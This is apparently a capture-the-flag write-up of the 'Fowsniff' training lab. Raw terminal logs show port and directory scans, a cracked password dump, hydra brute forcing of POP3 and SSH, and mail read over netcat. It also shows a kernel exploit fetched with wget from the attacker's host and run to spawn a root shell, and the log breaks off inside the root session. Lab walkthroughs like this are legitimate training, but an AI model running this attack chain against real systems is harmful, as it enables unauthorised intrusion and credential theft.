FROWNSNIFF


ENUMERATION 


"""
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/frownsniff]
└─$ sudo nmap -sV -sC  --min-rate 1500 10.10.178.138
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 07:12 EST
Nmap scan report for 10.10.178.138
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP SASL(PLAIN) RESP-CODES CAPA USER UIDL AUTH-RESP-CODE
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: IMAP4rev1 post-login capabilities ID AUTH=PLAINA0001 more Pre-login ENABLE have OK listed LOGIN-REFERRALS IDLE SASL-IR LITERAL+
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.20 seconds
                                                             


"""


GOBUSTER

"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/frownsniff]
└─$ gobuster dir -u http://10.10.178.138/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.178.138/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/28 07:13:03 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/assets               (Status: 301) [Size: 315] [--> http://10.10.178.138/assets/]
/images               (Status: 301) [Size: 315] [--> http://10.10.178.138/images/]
/robots.txt           (Status: 200) [Size: 26]                                    
/server-status        (Status: 403) [Size: 301]                                   
                                                                                  
===============================================================
2022/02/28 07:13:49 Finished
===============================================================


"""

OSINT 

FOUND THE PASSWORD DUMP

"""
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4 ---->mailcall 

mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56 ---> bilbo101

tegel@fowsniff:1dc352435fecca338acfd4be10984009 ----> 	apples01

baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb ----> 	skyler22

seina@fowsniff:90dc16d47114aa13671c697fd506cf26 -----> 	scoobydoo2

stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd

mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b ---> 	carp4ever

parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11 ---> 	orlando12

sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e ----> 	07011972


"""



BRUTE FORCE POP3 

"""
hydra -L usernames.txt -P password.txt -f 10.10.178.138  pop3 -V



┌──(kali㉿kali)-[~]
└─$ nc 10.10.178.138 110               
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
retr 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

.




"""


SSH


"""
hydra -v -V -u -L usernames.txt -P password.txt -t 20 -u 10.10.178.138 ssh

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/frownsniff]
└─$ hydra -v -V -u -L usernames.txt -P password.txt -t 20 -u 10.10.178.138 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-28 08:14:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[VERBOSE] More tasks defined than login/pass pairs exist. Tasks reduced to 11
[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:11/p:1), ~1 try per task
[DATA] attacking ssh://10.10.178.138:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://mauer@10.10.178.138:22
[INFO] Successful, password authentication is supported by ssh://10.10.178.138:22
[ATTEMPT] target 10.10.178.138 - login "mauer" - pass "S1ck3nBluff+secureshell" - 1 of 11 [child 0] (0/0)
[ATTEMPT] target 10.10.178.138 - login "mustikka" - pass "S1ck3nBluff+secureshell" - 2 of 11 [child 1] (0/0)
[ATTEMPT] target 10.10.178.138 - login "tegel" - pass "S1ck3nBluff+secureshell" - 3 of 11 [child 2] (0/0)
[ATTEMPT] target 10.10.178.138 - login "baksteen" - pass "S1ck3nBluff+secureshell" - 4 of 11 [child 3] (0/0)
[ATTEMPT] target 10.10.178.138 - login "siena" - pass "S1ck3nBluff+secureshell" - 5 of 11 [child 4] (0/0)
[ATTEMPT] target 10.10.178.138 - login "stone" - pass "S1ck3nBluff+secureshell" - 6 of 11 [child 5] (0/0)
[ATTEMPT] target 10.10.178.138 - login "mursten" - pass "S1ck3nBluff+secureshell" - 7 of 11 [child 6] (0/0)
[ATTEMPT] target 10.10.178.138 - login "parede" - pass "S1ck3nBluff+secureshell" - 8 of 11 [child 7] (0/0)
[ATTEMPT] target 10.10.178.138 - login "sciana" - pass "S1ck3nBluff+secureshell" - 9 of 11 [child 8] (0/0)
[ATTEMPT] target 10.10.178.138 - login "AJstone" - pass "S1ck3nBluff+secureshell" - 10 of 11 [child 9] (0/0)
[ATTEMPT] target 10.10.178.138 - login "AJ stone" - pass "S1ck3nBluff+secureshell" - 11 of 11 [child 10] (0/0)
[22][ssh] host: 10.10.178.138   login: baksteen   password: S1ck3nBluff+secureshell
[STATUS] attack finished for 10.10.178.138 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-28 08:14:27




LOGIN


"""




PRIV ESC


"""

baksteen@fowsniff:/tmp$ wget http://10.11.61.80:9000/exploit
--2022-02-28 08:36:34--  http://10.11.61.80:9000/exploit
Connecting to 10.11.61.80:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17384 (17K) [application/octet-stream]
Saving to: ‘exploit’

exploit                                   100%[====================================================================================>]  16.98K   101KB/s    in 0.2s    

2022-02-28 08:36:34 (101 KB/s) - ‘exploit’ saved [17384/17384]

baksteen@fowsniff:/tmp$ ls
exploit     systemd-private-d2e8eb0aa8bd4b52b8df3f09b4569862-dovecot.service-fjOoAJ
linpeas.sh  systemd-private-d2e8eb0aa8bd4b52b8df3f09b4569862-systemd-timesyncd.service-F1dhYI
baksteen@fowsniff:/tmp$ chmod +x exploit 
baksteen@fowsniff:/tmp$ ls
exploit     systemd-private-d2e8eb0aa8bd4b52b8df3f09b4569862-dovecot.service-fjOoAJ
linpeas.sh  systemd-private-d2e8eb0aa8bd4b52b8df3f09b4569862-systemd-timesyncd.service-F1dhYI
baksteen@fowsniff:/tmp$ ./exploit 
task_struct = ffff880037134600
uidptr = ffff88003b8dc6c4
spawning root shell
root@fowsniff:/tmp# id
uid=0(root) gid=0(root) groups=0(root),100(users),1001(baksteen)
root@fowsniff:/tmp# cd /home
root@fowsniff:/home# ls
baksteen  mauer  mursten  mustikka  parede  sciana  seina  stone  tegel
root@fowsniff:/home# cd seina
root@fowsniff:/home/seina# ls
doubt.txt  Maildir
root@fowsniff:/home/seina# locate user.txt
root@fowsniff:/home/seina# cd ..
root@fowsniff:/home# ls
baksteen  mauer  mursten  mustikka  parede  sciana  seina  stone  tegel
root@fowsniff:/home# cd bask
bash: cd: bask: No such file or directory
root@fowsniff:/home# cd baksteen/
root@fowsniff:~# ls


"""